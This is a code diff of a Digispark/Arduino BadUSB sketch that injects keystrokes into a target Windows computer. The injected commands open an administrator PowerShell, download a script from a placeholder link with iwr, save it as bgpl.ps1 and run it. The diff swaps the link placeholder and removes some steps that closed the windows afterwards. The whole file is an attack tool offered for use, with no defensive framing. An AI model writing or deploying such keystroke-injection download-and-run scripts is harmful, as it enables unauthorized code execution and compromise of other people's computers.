@@ -10,7 +10,7 @@ void loop() { //depending on how slow the target computer is you may want to add
   DigiKeyboard.delay(10);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(500);
-  DigiKeyboard.print("Start-Process powershell -Verb runAs");
+  DigiKeyboard.print("Start-Process powershell -Verb runAs; exit");
   DigiKeyboard.delay(10);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(500); //!
@@ -38,23 +38,12 @@ void loop() { //depending on how slow the target computer is you may want to add
   DigiKeyboard.delay(10);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(500);
-  DigiKeyboard.print("powershell -command '& { iwr LINKTHATCONTAINSbgpl.ps1HEREYOUCANUSEADISCORDLINKEVENLOL! -OutFile bgpl.ps1 }'");
+  DigiKeyboard.print("powershell -command '& { iwr LINKTHATCONTAINSPAYLOADHERE -OutFile bgpl.ps1 }'");
   DigiKeyboard.delay(10);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(500);
   DigiKeyboard.print("./bgpl.ps1");
   DigiKeyboard.delay(10);
-  DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(1000);
-  DigiKeyboard.sendKeyStroke(MOD_ALT_LEFT, KEY_TAB);
-  DigiKeyboard.delay(1000);
-  DigiKeyboard.print("Exit");
-  DigiKeyboard.delay(100);
-  DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.sendKeyStroke(MOD_ALT_LEFT, KEY_TAB);
-  DigiKeyboard.delay(1000);
-  DigiKeyboard.print("Exit");
-  DigiKeyboard.delay(100);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   for(;;){ }
 }
